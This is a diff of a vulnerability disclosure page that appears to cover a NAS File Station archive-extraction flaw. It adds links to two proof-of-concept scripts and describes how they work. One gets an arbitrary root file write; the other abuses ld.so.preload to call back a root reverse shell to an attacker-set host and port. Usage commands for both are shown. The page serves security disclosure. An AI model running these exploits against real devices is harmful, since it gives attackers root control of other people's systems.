@@ -103,13 +103,13 @@
 <h2 id="proof-of-concept">Proof of concept</h2>
 <p>Two scripts: Both run on the attacker's side with a normal user's credentials, they build the RAR in memory, log in, and upload it to <code>--dest</code> (a folder an administrator can browse). The trigger is an administrator extracting that archive in File Station. In the examples below <code>/share</code> is a File Station folder the normal account can write.</p>
 <ul>
-<li><strong>1-click normal-user-auth arbitrary file write</strong>: <code>poc_arb_file_write.py</code>. Plants the archive; when an administrator extracts it, <code>--target</code> is written as root. WARNING: the extraction re-owns the target's <strong>parent</strong> directory (e.g. <code>/etc</code>) to the extracting administrator, which can break system commands; restore it with <code>chown root:root /etc; chmod 0755 /etc</code>. Example:</li>
+<li><strong>1-click normal-user-auth arbitrary file write</strong>: <a href="poc_arb_file_write.py"><code>poc_arb_file_write.py</code></a>. Plants the archive; when an administrator extracts it, <code>--target</code> is written as root. WARNING: the extraction re-owns the target's <strong>parent</strong> directory (e.g. <code>/etc</code>) to the extracting administrator, which can break system commands; restore it with <code>chown root:root /etc; chmod 0755 /etc</code>. Example:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code>python3 poc_arb_file_write.py --url https://nas:5001 --user alice --password &#39;Passw0rd!&#39; --dest /share --file ./hello.txt --target /etc/hello.txt
 </code></pre></div>
 
 <ul>
-<li><strong>1-click normal-user-auth RCE</strong>: <code>poc_rce.py</code>. Plants a RAR that drops <code>/etc/ld.so.preload</code> and a tiny <code>.so</code> (built locally with <code>gcc</code>), then listens and nudges <code>/webman/login.cgi</code> so that once an administrator extracts the archive, the next root <code>execve</code> loads the library and connects back a root shell. On connect it removes <code>/etc/ld.so.preload</code> and restores <code>/etc</code> ownership. Example:</li>
+<li><strong>1-click normal-user-auth RCE</strong>: <a href="./poc_rce.py"><code>poc_rce.py</code></a>. Plants a RAR that drops <code>/etc/ld.so.preload</code> and a tiny <code>.so</code> (built locally with <code>gcc</code>), then listens and nudges <code>/webman/login.cgi</code> so that once an administrator extracts the archive, the next root <code>execve</code> loads the library and connects back a root shell. On connect it removes <code>/etc/ld.so.preload</code> and restores <code>/etc</code> ownership. Example:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code>python3 poc_rce.py --url https://nas:5001 --user alice --password &#39;Passw0rd!&#39; --dest /share --lhost 192.168.1.100 --lport 4444
 </code></pre></div>
